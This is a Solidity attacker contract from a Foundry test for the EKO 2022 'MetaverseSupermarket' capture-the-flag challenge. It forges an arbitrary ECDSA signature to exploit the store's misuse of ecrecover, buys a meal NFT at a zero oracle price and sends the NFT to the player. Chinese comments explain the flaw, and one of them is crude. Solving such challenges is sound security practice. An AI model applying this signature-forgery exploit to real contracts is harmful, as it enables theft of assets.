// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {OraclePrice, Signature, InflaStore, Meal, Infla} from "../../src/eko2022/05_MetaverseSupermarket/MetaverseSupermarket.sol";

contract MetaverseSupermarket_Attacker {
	address player;
	InflaStore inflaStore;
	
	constructor(InflaStore inflaStore_) {
		player = msg.sender;
		inflaStore = inflaStore_;
	}
	
	receive() external payable {}
	
	function onERC721Received(
		address,
		address,
		uint256,
		bytes calldata
	) external virtual returns (bytes4) {
		return this.onERC721Received.selector;
	}
	
	function doAttack() public {
		// 借助`商店合约对于 ecrecover 的滥用`
		// 直接构建任意签名值，即可满足调用条件
		
		OraclePrice memory price = OraclePrice({
			blockNumber: block.number,
			price: 0
		});

		Signature memory sig = Signature({
			v: 27,
			r: bytes32(uint(1234)),
			s: bytes32(uint(4567))
		});

		inflaStore.buyUsingOracle(price, sig);
	
		// 傻逼NFT，没有对外公布id的接口，硬写一下id
		inflaStore.meal().transferFrom(address(this), player, 0);
	}
}
